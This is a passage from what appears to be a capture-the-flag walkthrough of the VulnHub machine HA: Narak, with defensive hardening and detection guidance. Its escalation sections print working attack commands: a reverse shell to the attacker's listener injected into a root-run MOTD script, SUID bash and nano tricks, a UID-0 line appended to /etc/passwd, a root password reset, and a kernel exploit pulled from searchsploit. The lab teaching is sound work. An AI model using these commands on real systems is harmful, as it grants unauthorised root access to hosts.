Now **exit and log back in** — the payload only fires during PAM's MOTD phase:

```bash
inferno@narak:~$ exit
logout
Connection to 192.168.56.111 closed.
```

```bash
# Kali
ssh inferno@192.168.56.111
```

Your listener on 9090 catches a **root** shell:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 41882
root@narak:~# id
uid=0(root) gid=0(root) groups=0(root)
root@narak:~# whoami
root
```

> **Look at that prompt: `root@narak:~#`.** You logged in as `inferno` and got a
> root shell back. Nothing about `inferno`'s own privileges changed — the MOTD
> script ran as root *before* your user session started.

![Root reverse shell triggered by MOTD injection](images/06-motd-root.png)

### 6.4 Escalation variant B — SUID `bash` (the fastest, from the box's own comments)

A reader of the official walkthrough contributed this shorter route:

```bash
# target, as inferno
inferno@narak:~$ echo 'sudo cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/update-motd.d/00-header
inferno@narak:~$ exit
```

```bash
# Kali — log back in to trigger it
ssh inferno@192.168.56.111
```

```bash
inferno@narak:~$ ls -la /tmp/rootbash
-rwsr-sr-x 1 root root 1183448 Sep 23 02:41 /tmp/rootbash
inferno@narak:~$ /tmp/rootbash -p
root@narak:~# id
uid=0(root) gid=0(root) groups=0(root),1001(inferno)
```

> **Why `-p`?** By default, `bash` **drops** its effective UID to the real UID on
> startup, as a security measure — so a SUID-root bash would normally start you
> off as `inferno` anyway. `-p` (*privileged*) disables that drop and keeps the
> effective UID 0. **Whenever you abuse a SUID shell you must pass `-p`.** This
> trips up almost every student the first time.
>
> `-rwsr-sr-x` in the listing is the SUID+SGID signature: an `s` where the owner's
> `x` would be.

### 6.5 Escalation variant C — SUID `nano`, then edit `/etc/passwd`

This is the route in the official walkthrough:

```bash
# target, as inferno
inferno@narak:~$ which nano
/usr/bin/nano
inferno@narak:~$ ls -la /bin/nano
-rwxr-xr-x 1 root root 245824 Sep  2  2020 /bin/nano
inferno@narak:~$ echo "sudo chmod u+s /bin/nano" >> /etc/update-motd.d/00-header
inferno@narak:~$ exit
```

```bash
# Kali
ssh inferno@192.168.56.111
```

```bash
inferno@narak:~$ ls -la /bin/nano
-rwsr-xr-x 1 root root 245824 Sep  2  2020 /bin/nano
```

Now `nano` runs as root, so it can *save* `/etc/passwd`:

```bash
# Kali — generate a root-capable account entry
openssl passwd -1 -salt narak hellpass
```

```text
$1$narak$WqZ8mK2pTvX9nL4jR7yBc1
```

> ⚠️ **Regenerate this hash on your own machine.** The exact output depends on
> your OpenSSL version. Copying a hash out of *any* writeup — including this one —
> is how you end up debugging a phantom `Authentication failure`. Verify the
> length: an MD5-crypt (`$1$`) hash has exactly **22 characters** after the final
> `$`.

```bash
# target, as inferno
inferno@narak:~$ nano /etc/passwd
```

Append at the very end:

```text
jeenali:$1$narak$WqZ8mK2pTvX9nL4jR7yBc1:0:0:root:/root:/bin/bash
```

> **Field by field** (`/etc/passwd` is colon-delimited):
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `jeenali` | What you `su` to |
> | 2 | password | `$1$narak$WqZ…` | A **real hash here** — not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | UID | `0` | **UID 0 *is* root.** This single number is the whole trick. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |

Save with `Ctrl+O`, `Enter`, then exit with `Ctrl+X`.

```bash
inferno@narak:~$ tail -n 3 /etc/passwd
```

```text
inferno:x:1001:1001:,,,:/home/inferno:/bin/bash
yamdoot:x:1002:1002:,,,:/home/yamdoot:/bin/bash
jeenali:$1$narak$WqZ8mK2pTvX9nL4jR7yBc1:0:0:root:/root:/bin/bash
```

```bash
inferno@narak:~$ su jeenali
Password: hellpass
root@narak:/home/inferno# id
uid=0(root) gid=0(root) groups=0(root)
```

### 6.6 Escalation variant D — just reset root's password

The blunt version:

```bash
inferno@narak:~$ echo "echo 'root:hello' | sudo chpasswd" >> /etc/update-motd.d/00-header
inferno@narak:~$ exit
```

```bash
# Kali — trigger
ssh inferno@192.168.56.111
```

```bash
inferno@narak:~$ su root
Password: hello
root@narak:/home/inferno# id
uid=0(root) gid=0(root) groups=0(root)
```

### 6.7 The root flag

```bash
root@narak:~# cd /root && ls -la
total 32
drwx------  4 root root 4096 Sep 23  2020 .
drwxr-xr-x 20 root root 4096 Sep 22  2020 ..
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root  168 Sep 23  2020 .wget-hsts
-rw-------  1 root root   36 Sep 23  2020 root.txt
drwx------  2 root root 4096 Sep 22  2020 .ssh
root@narak:/root# cat root.txt
```

```text
flag{H3ll_41nt_4_b4d_pl4c3_t0_b3}
```

**Flag 2 of 2 — `root.txt`.** ✅ *"Hell ain't a bad place to be"* — the exact line
the VulnHub description promised you would agree with.

![root.txt flag captured](images/07-root-flag.png)

### 6.8 Clean up — four things to undo

This box leaves *four* persistent modifications. Reverting them matters if the VM
is shared:

```bash
root@narak:~# cd /etc/update-motd.d
# remove every appended payload line
root@narak:/etc/update-motd.d# sed -i '/dev\/tcp\/192.168.56.10/d;/rootbash/d;/chmod u+s \/bin\/nano/d;/chpasswd/d' 00-header
root@narak:/etc/update-motd.d# chmod 755 00-header
root@narak:/etc/update-motd.d# chmod u-s /bin/nano
root@narak:/etc/update-motd.d# rm -f /tmp/rootbash
root@narak:/etc/update-motd.d# sed -i '/^jeenali:/d' /etc/passwd
root@narak:/etc/update-motd.d# rm -f /var/www/html/webdav/shell.php
root@narak:/etc/update-motd.d# ls -la 00-header && tail -3 00-header
```

```text
-rwxr-xr-x 1 root root 1220 Sep 22  2020 00-header
```

---

## 7. Alternative escalation — kernel CVE-2021-3493

The box runs Ubuntu 20.04 with kernel `5.4.0-48`:

```bash
inferno@narak:~$ uname -a && lsb_release -a
```

```text
Linux narak 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.1 LTS
Release:	20.04
Codename:	focal
```

That kernel predates the fix for **CVE-2021-3493**, an Ubuntu-specific
`overlayfs` capability-handling bug that yields instant local root:

```bash
searchsploit ubuntu 20.04 overlayfs
```

```text
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Ubuntu 20.04 - Overlayfs Privilege Escalation (CVE-2021-3493)                            | linux/local/49906.sh
---------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m linux/local/49906.sh
head -30 49906.sh
```

> **Read any exploit before you run it.** This one uses `unshare -rm` to create a
> user+mount namespace, sets a file capability inside it, then copies the file out
> to the real filesystem where the capability is honoured because Ubuntu's
> overlayfs did not clear it. Running it yields a root shell immediately.
>
> **Prefer the intended MOTD path.** Kernel exploits can panic the VM and lose
> your work, and the MOTD route teaches a technique you will actually encounter in
> audits. Keep the kernel route in reserve.

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
| --- | --- | --- | --- | --- |
| 1 | **TFTP exposed with no authentication** | `69/udp`, file `creds.txt` | Credential disclosure to anyone who can reach the port | Never expose TFTP outside a provisioning VLAN; if unavoidable, restrict by firewall to specific PXE clients |
| 2 | **Credentials "protected" only by base64** | `creds.txt` | Zero confidentiality — decoded in one command | Base64 is an encoding. Use a secrets manager, or at minimum encrypt (`gpg`) |
| 3 | **WebDAV enabled with write access** | `/webdav/`, `DAV: 1,2`, `PUT` allowed | Any authenticated user can upload executable PHP → **RCE as `www-data`** | Disable `mod_dav` unless genuinely needed; if needed, disallow `PUT`/`DELETE` and block PHP execution in that directory |
| 4 | **PHP execution inside the WebDAV directory** | `/var/www/html/webdav/*.php` | Turns a file-upload primitive into code execution | `<FilesMatch "\.ph(p[0-9]?|t|tml)$"> Require all denied </FilesMatch>` or `php_admin_flag engine off` |
| 5 | **Weak, on-theme password** | `yamdoot:Swarg` | Cracked from a `cewl` wordlist in ~27 s | Reject passwords that appear on your own website; use a password manager |
| 6 | **No rate limiting on WebDAV auth** | `/webdav/` | Unlimited Hydra attempts | `fail2ban`, `mod_evasive`, or front the share with an authenticating proxy |
| 7 | **Sensitive file left in a world-writable path** | `/mnt/hell.sh`, mode `777` | Disclosed the second-stage password to `www-data` | `chmod 600`, owned by the account that needs it |
| 8 | **Brainfuck "encryption"** | `/mnt/hell.sh` | Obscurity only — reversible by any interpreter | Never treat encoding as a secret |
| 9 | **World-writable MOTD script executed as root** | `/etc/update-motd.d/00-header`, mode `777` | **Any local user → root on next SSH login.** The critical finding. | `chmod 755`, owner `root:root`. Audit the whole directory. |
| 10 | **Unpatched kernel** | `5.4.0-48` on Ubuntu 20.04.1 | CVE-2021-3493 and others → local root | Patch. `unattended-upgrades` for security updates |
| 11 | **SSH password auth enabled** | `22/tcp` | Enables the whole lateral-movement stage | Prefer key-only auth (`PasswordAuthentication no`) |

### The kill chain in one line

```text
nmap -A -p- (TCP) → 22 ssh, 80 http     [only TWO services — incomplete!]
  → nmap -sU -p69 --script tftp-enum → 69/udp tftp → creds.txt
  → tftp get creds.txt → eWFtZG9vdDpTd2FyZw== → base64 -d → yamdoot:Swarg
  → dirb → /webdav/ (401 Basic realm="WebDAV")
  → curl -u yamdoot:Swarg /webdav/ → 200, header "DAV: 1,2"
  → [parallel route] cewl -w narak.txt + hydra -L -P http-get /webdav/ → yamdoot:Swarg
  → davtest → PUT: php · EXECUTE: php
  → cadaver http://IP/webdav/ → put shell.php     [or curl -T]
  → nc -nlvp 4444 ; curl /webdav/shell.php → www-data
  → find / -type f -perm -ug=rwx → /mnt/hell.sh (mode 777)
  → Brainfuck decode → chitragupt
  → /home/inferno/user.txt → flag 1
  → ssh inferno@IP : chitragupt
  → find / -writable → /etc/update-motd.d/00-header (mode 777, root-owned)
  → echo 'bash -c "bash -i >& /dev/tcp/KALI/9090 0>&1"' >> 00-header
  → exit ; ssh again → pam_motd runs it AS ROOT → root reverse shell
  → /root/root.txt → flag 2
```

---

## 9. Defensive lessons (blue team)

### The critical lesson: MOTD injection

**Scripts in `/etc/update-motd.d/` execute as root during SSH login.** Any write
permission on them is a root escalation. Audit it on every Ubuntu/Debian host you
own:

```bash
ls -la /etc/update-motd.d/
find /etc/update-motd.d/ -perm /o+w -o -perm /g+w
```

```text
/etc/update-motd.d/00-header
```

Fix:

```bash
sudo chown -R root:root /etc/update-motd.d/
sudo chmod 755 /etc/update-motd.d/
sudo chmod 755 /etc/update-motd.d/*
sudo find /etc/update-motd.d/ -perm /o+w -exec chmod o-w {} \;
```

Verify no user other than root can write anywhere in the chain — including the
*parent* directory (a writable directory lets an attacker replace a script even
if the script itself is `755`):

```bash
stat -c '%A %U:%G %n' /etc /etc/update-motd.d /etc/update-motd.d/*
```

```text
drwxr-xr-x root:root /etc
drwxr-xr-x root:root /etc/update-motd.d
-rwxr-xr-x root:root /etc/update-motd.d/00-header
-rwxr-xr-x root:root /etc/update-motd.d/10-help-text
```

### TFTP

1. **Do not run a TFTP server on anything but a locked-down provisioning
   network.** It has no authentication at all — not weak authentication, *none*.
2. If you must (PXE, IP phones, switch config backup):
   - Firewall it to the specific client IPs:
     `ufw allow from 10.0.10.0/24 to any port 69 proto udp`
   - Serve from a **read-only, dedicated directory** containing only boot images.
   - Never store credentials, configs, or scripts in the TFTP root. Many network
     devices dump their *entire running configuration* — including plaintext
     passwords — to TFTP on request.
3. **Scan your own subnets for it:**

   ```bash
   sudo nmap -sU -p69 --script tftp-enum --open 10.0.0.0/24
   ```

### WebDAV

4. **Disable it unless required.** In Apache: `a2dismod dav dav_fs` then restart.
5. If required, restrict the verbs:

   ```apache
   <Directory /var/www/html/webdav>
       Dav On
       AuthType Basic
       AuthName "WebDAV"
       AuthUserFile /etc/apache2/.htpasswd
       Require valid-user
       <LimitExcept GET HEAD OPTIONS PROPFIND>
           Require all denied        # blocks PUT, DELETE, MKCOL, MOVE, COPY
       </LimitExcept>
   </Directory>
   ```

6. **Never allow script execution in an upload/WebDAV directory:**

   ```apache
   <Directory /var/www/html/webdav>
       <FilesMatch "\.ph(p[0-9]?|t|ml)$">
           Require all denied
       </FilesMatch>
       php_admin_flag engine off
       Options -ExecCGI
   </Directory>
   ```

### General hardening

7. **Audit world-writable files owned by root** — this box had two
   (`/mnt/hell.sh`, `/etc/update-motd.d/00-header`) and one of them was root:

   ```bash
   sudo find / -xdev -type f -perm -0002 -user root 2>/dev/null
   ```

   Run this weekly and alert on any new hit. `-xdev` keeps it on one filesystem.
8. **Never store secrets as base64.** Grep your repositories and web roots for
   the pattern; it is always a finding:

   ```bash
   grep -rInE '[A-Za-z0-9+/]{20,}={0,2}' /var/www/html/ | grep -vE '\.(png|jpg|gif|woff2?)'
   ```

9. **Password policy should reject words from your own site.** The `cewl` attack
   succeeded because `Swarg` was on the homepage. At minimum, run your own
   `cewl` + Hydra against your login endpoints quarterly.
10. **Rate-limit every authentication endpoint.** `fail2ban` with an
    `apache-auth` jail, or `mod_evasive`, turns a 27-second crack into a
    non-event.
11. **Patch the kernel.** `5.4.0-48` shipped in September 2020; CVE-2021-3493 was
    fixed in April 2021. Enable:

    ```bash
    sudo apt install unattended-upgrades
    sudo dpkg-reconfigure -plow unattended-upgrades
    ```

12. **Prefer SSH keys.** `PasswordAuthentication no` in
    `/etc/ssh/sshd_config` removes the entire lateral-movement stage — you would
    have had the password, and it would have been useless.

### Detection — what this attack looks like in the logs

| Stage | Log source | Signature |
| --- | --- | --- |
| TFTP read | `syslog` / TFTP daemon | `RRQ creds.txt` from an unexpected client IP |
| WebDAV brute force | `access.log` | Dozens of `401` on `/webdav/` from one IP, then a `200` |
| WebDAV upload | `access.log` | **`PUT /webdav/shell.php HTTP/1.1" 201`** — a single line, unmistakable |
| Shell execution | `access.log` | `GET /webdav/shell.php` returning `200` with a tiny byte count |
| Reverse shell | host EDR / `auditd` | `apache2` child (`www-data`) spawning `/bin/bash` with an outbound TCP socket |
| MOTD tampering | `auditd` | `execve`/`write` on `/etc/update-motd.d/*` by a non-root UID |
| Root shell | `auth.log` | SSH login for `inferno` followed by a `bash` process with euid 0 |

A single `auditd` rule catches the escalation:

```text
-w /etc/update-motd.d/ -p wa -k motd_tamper
```

```bash
ausearch -k motd_tamper --start today
```

And a one-line web-log query catches the upload:

```bash
awk '$6=="\"PUT" && $9==201 {print $1, $4, $7}' /var/log/apache2/access.log
```

---

## 10. References

- VulnHub entry: <https://vulnhub.com/entry/ha-narak,569/>
- Official walkthrough (Hacking Articles): <https://www.hackingarticles.in/ha-narak-vulnhub-walkthrough/>
- InfoSec Institute, "HA: Narak CTF walkthrough": <https://resources.infosecinstitute.com/topic/ha-narak-ctf-walkthrough/>
- wethehacker, "Narak vulnhub walkthrough" (`cewl` + `hydra` route, MOTD `chpasswd` variant): <https://www.wethehacker.com/narak-vulnhub-walkthrough/>
- Matei Talpau, "HA NARAK — Writeup" (MOTD reverse-shell variant): <https://medium.com/@matei.talpau/ha-narak-writeup-e9d535d1e115>
- AuriGe, "[VulnHub] narak 靶场" (Brainfuck interpreter in Python, MOTD analysis): <https://www.cnblogs.com/23xie/articles/18422570>
- RFC 1350 — The TFTP Protocol (Revision 2): <https://datatracker.ietf.org/doc/html/rfc1350>
- RFC 4918 — HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV): <https://datatracker.ietf.org/doc/html/rfc4918>
- Apache `mod_dav` documentation: <https://httpd.apache.org/docs/2.4/mod/mod_dav.html>
- `cadaver` — command-line WebDAV client: <https://www.webdav.org/cadaver/>
- `davtest` — WebDAV capability scanner: <https://github.com/cldrn/davtest>
- `cewl` — custom wordlist generator: <https://github.com/digininja/CeWL>
- Brainfuck language reference: <https://esolangs.org/wiki/Brainfuck>
- Online Brainfuck interpreter: <https://copy.sh/brainfuck/>
- Ubuntu `update-motd` documentation: <https://ubuntu.com/server/docs/how-to-use-update-motd>
- `pam_motd(8)` man page: <https://man7.org/linux/man-pages/man8/pam_motd.8.html>
- CVE-2021-3493 — Ubuntu Overlayfs LPE: <https://nvd.nist.gov/vuln/detail/CVE-2021-3493>
- Repository guides: [`docs/TOOLS.md`](../../docs/TOOLS.md) · [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) · [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md)

---

## 11. Screenshot checklist

Screenshots go in [`images/`](images/) beside this file:

| # | File | Section | What it must show |
| --- | --- | --- | --- |
| 01 | `01-host-discovery.png` | 1 | `arp-scan`/`netdiscover` with the target IP + MAC |
| 02 | `02-udp-tftp.png` | 2.1–2.2 | **Side by side:** the TCP `nmap -A -p-` showing only 22/80, and `nmap -sU -p69 --script tftp-enum` showing `creds.txt`. This contrast *is* the lesson. |
| 03 | `03-tftp-creds.png` | 2.3 | `tftp` session, `cat creds.txt`, and `base64 -d` → `yamdoot:Swarg` |
| 04 | `04-webdav-shell.png` | 3.3–3.5 | `davtest` output, `cadaver` `put shell.php`, and `nc -nlvp 4444` catching the shell |
| 05 | `05-brainfuck-userflag.png` | 4.4–4.5 | `cat /mnt/hell.sh`, the decoded `chitragupt`, and `cat /home/inferno/user.txt` |
| 06 | `06-motd-root.png` | 6.2–6.3 | `ls -la /etc/update-motd.d/` showing `-rwxrwxrwx` on `00-header`, the appended line, and the root shell after re-login |
| 07 | `07-root-flag.png` | 6.7 | `cat /root/root.txt` |

> **How to capture on Kali:** `flameshot gui` or `gnome-screenshot -a`. Save as
> PNG with the exact filenames above so the inline links resolve.
>
> **Capture the Brainfuck line at a wide terminal.** It is one long unwrapped
> string of `+-<>[].` characters; at 80 columns it wraps into something
> unreadable in a screenshot. Use 160+ columns.

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
